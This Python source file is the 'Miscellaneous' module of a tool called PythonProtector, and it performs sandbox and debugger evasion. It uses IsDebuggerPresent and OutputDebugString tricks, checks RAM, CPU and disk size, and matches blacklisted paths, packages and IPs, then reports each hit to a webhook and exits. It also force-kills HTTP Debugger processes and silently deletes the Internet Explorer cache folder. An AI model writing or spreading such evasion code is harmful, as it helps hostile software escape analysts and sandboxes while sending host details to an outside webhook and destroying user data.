"""
    ____          ____                __               __
   / __ \\ __  __ / __ \\ _____ ____   / /_ ___   _____ / /_
  / /_/ // / / // /_/ // ___// __ \\ / __// _ \\ / ___// __/
 / ____// /_/ // ____// /   / /_/ // /_ /  __// /__ / /_
/_/     \\__, //_/    /_/    \\____/ \\__/ \\___/ \\___/ \\__/
       /____/

Made With ❤️ By Ghoul & Marci
"""

import ctypes
import os
import sys
import time

import pkg_resources
import psutil
import win32api

from ..constants import Lists, UserInfo
from ..utils.http import hasInternet
from ..utils.webhook import Webhook


class Miscellanoeus:
    def __init__(self, webhook_url: str, logger):
        self.webhook_url = webhook_url
        self.logger = logger
        self.webhook = Webhook(self.webhook_url)

    def CheckInternet(self):
        while True:
            try:
                time.sleep(5)
                if hasInternet() == False:
                    self.logger.info("CheckInternet Failed")
                    os._exit(1)
                else:
                    pass
            except BaseException:
                pass

    def CheckRam(self):
        memory = psutil.virtual_memory().total
        if memory <= 4294967296:
            self.logger.info("RAM Check Failed")
            self.webhook.send(
                f"RAM Check: Less than 4 GB of RAM exists on this system",
                "Miscellaneous",
            )
            os._exit(1)

    def CheckIsDebuggerPresent(self):
        isDebuggerPresent = ctypes.windll.kernel32.IsDebuggerPresent()

        if isDebuggerPresent:
            self.logger.send("IsDebuggerPresent Returned True")
            self.webhook.send(
                f"IsDebuggerPresent: A debugger is present, exiting program...",
                "Miscellaneous",
            )
            os._exit(1)

        if (
            ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                ctypes.windll.kernel32.GetCurrentProcess(), False
            )
            != 0
        ):
            self.logger.send("CheckRemoteDebuggerPresent Returned True")
            self.webhook.send(
                "CheckRemoteDebuggerPresent: A debugger is present, exiting program...",
                "Miscellaneous",
            )
            os._exit(1)

    def CheckDiskSize(self):
        minDiskSizeGB = 50
        if len(sys.argv) > 1:
            minDiskSizeGB = float(sys.argv[1])
        _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
        diskSizeGB = diskSizeBytes / 1073741824

        if diskSizeGB < minDiskSizeGB:
            self.logger.info("Disk Check Failed")
            self.webhook.send(
                f"Disk Check: The disk size of this host is {diskSizeGB} GB, which is less than the minimum {minDiskSizeGB} GB"
            )
            os._exit(1)

    def KillTasks(self):
        self.logger.info("Killing Tasks")
        os.system("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1")
        os.system("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1")
        os.system("sc stop HTTPDebuggerPro >nul 2>&1")
        os.system(
            'cmd.exe /c @RD /S /Q "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE" >nul 2>&1'
        )
        self.logger.info("All Tasks Killed")

    def CheckPaths(self):
        for path in Lists.BLACKLISTED_PATHS:
            if os.path.exists(path):
                self.logger.info("Blacklisted Path Found")
                self.webhook.send("Blacklisted Path Found", "Miscellaneous")
                os._exit(1)
            else:
                pass

    def CheckImports(self):
        for package in Lists.BLACKLISTED_IMPORTS:
            try:
                dist = pkg_resources.get_distribution(package)
                if dist:
                    self.logger.info(f"{package} Was Found Installed")
                    self.webhook.send(
                        f"`{package}` Was Found Installed On User Machine",
                        "Miscellaneous",
                    )
                    os._exit(1)
                else:
                    pass
            except pkg_resources.DistributionNotFound:
                pass

    def CheckOutPutDebugString(self):
        win32api.SetLastError(0)
        win32api.OutputDebugString("PythonProtector Intruding...")
        if win32api.GetLastError() != 0:
            self.logger.info("OutputDebugString Is Not 0")
            self.webhook.send(
                "OutputDebugString Not Equal To 0",
                "Miscellaneous")
            os._exit(1)

    def CheckIPs(self):
        if UserInfo.IP in Lists.BLACKLISTED_IPS:
            self.logger.info(f"{UserInfo.IP} Is A Blacklisted IP Address")
            self.webhook.send(
                f"`{UserInfo.IP}` Is A Blacklisted IP Address", "Miscellaneous"
            )
            os._exit(1)
        else:
            pass

    # Thanks Tekky
    def CheckCPUCores(self):
        try:
            if int(psutil.cpu_count()) <= 1:
                self.logger.info(f"CPU Core Count Is Less Than Or Equal To 1")
                self.webhook.send(
                    f"CPU Core Count Is Less Than Or Equal To `1`",
                    "Miscellaneous")
                os._exit(1)
        except BaseException:
            pass

    def StartChecks(self):
        self.logger.info("Starting Miscellaneous Checks")
        self.CheckImports()
        self.CheckPaths()
        self.CheckIPs()
        self.CheckCPUCores()
        self.CheckRam()
        self.CheckIsDebuggerPresent()
        self.CheckOutPutDebugString()
        self.CheckDiskSize()
        self.KillTasks()

        self.CheckInternet()
